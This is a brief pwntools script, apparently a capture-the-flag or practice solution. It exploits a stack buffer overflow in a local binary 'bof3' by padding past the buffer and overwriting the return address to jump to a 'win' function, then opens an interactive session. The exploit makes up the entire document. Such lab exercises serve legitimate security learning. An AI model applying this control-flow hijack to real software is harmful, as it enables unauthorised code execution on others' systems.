from pwn import *

r = process('./bof3')

win = 0x401249
payload = b'a'*(0x20 + 0x8) + p64(win + 5)
r.sendafter(b'> ', payload)
r.interactive()